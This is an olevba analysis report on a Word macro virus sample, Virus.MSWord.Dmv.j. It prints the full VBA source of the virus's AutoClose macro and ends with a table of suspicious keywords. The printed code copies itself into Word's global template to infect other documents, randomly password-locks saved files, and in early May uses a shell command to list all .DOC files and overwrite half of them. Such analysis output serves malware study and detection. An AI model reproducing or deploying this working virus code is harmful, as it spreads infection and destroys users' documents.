olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Dmv.j
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Dmv.j - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: ./Virus.MSWord.Dmv.j - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim total
Dim present
Dim cycle
Dim a$
Dim Keyword$
Dim a_
Dim b
Dim num
Dim i
Dim DeleteListExists
Dim FileCount
Dim curdoc$

On Error Resume Next
total = WordBasic.CountMacros(0)
present = 0
WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
WordBasic.DisableAutoMacros 0

Rem Check and see if the AutoClose macro is installed in global.
If total > 0 Then
    For cycle = 1 To total
        If WordBasic.[MacroName$](cycle, 0) = "AutoClose" Then
           present = 1
        End If
'End If

Rem Get the current document name.
a$ = WordBasic.[WindowName$]() + ":AutoClose"

If present <> 1 Then
    WordBasic.MacroCopy a$, "Global:AutoClose", 1

Else
    present = 0
    If WordBasic.CountMacros(1) <> 0 Then
        present = 1
    End If

    If present = 0 Then
        WordBasic.FileSaveAs Format:=1
        WordBasic.MacroCopy "Global:AutoClose", a$, 1
        
    End If
End If

If ((WordBasic.Day(WordBasic.Now())) Mod 7) = 0 And ((WordBasic.Hour(WordBasic.Now())) Mod 2) = 0 Then
    Keyword$ = ""
    a_ = 65
    b = 122
    num = WordBasic.Int(Rnd() * (b - a_) + a_)
    For i = 0 To 10
        Keyword$ = Keyword$ + Chr(WordBasic.Int(Rnd() * (b - a_) + a_))
    Next i
    WordBasic.ToolsOptionsSave Password:=Keyword$
End If
MissOutPassWording:

If (WordBasic.Day(WordBasic.Now()) >= 1 And WordBasic.Day(WordBasic.Now()) <= 5) And WordBasic.Month(WordBasic.Now()) = 5 Then
On Error GoTo -1: On Error GoTo DeleteListNotFound:

Open "C:\RO.TXT" For Input As 1
    DeleteListExists = 1
    Close 1
    GoTo EndDeleteListProcessing:

DeleteListNotFound:
    DeleteListExists = 0

EndDeleteListProcessing:

On Error Resume Next
    
    If DeleteListExists = 1 Then
        Open "C:\RO.TXT" For Input As 1
        FileCount = 0

    Rem Write alternate files.
        While Not EOF(1)
            Line Input #1, curdoc$
            FileCount = FileCount + 1
            If FileCount Mod 2 = 0 Then
                Open curdoc$ For Output As 2
                Print #2, "                        "
                Print #2, "                        "
            End If
            Close 2
        Wend
        Close 1
        WordBasic.Kill "C:\RO.TXT"
    End If
    
    If DeleteListExists = 0 Then
        WordBasic.Shell Environ("COMSPEC") + " /c dir /b /s C:\*.DOC > " + Chr(9) + Chr(9) + Chr(9) + "C:\RO.TXT", 0
        
    End If

End If
    

NoKill:

Next
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO NewMacros 
in file: ./Virus.MSWord.Dmv.j - OLE stream: 'NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

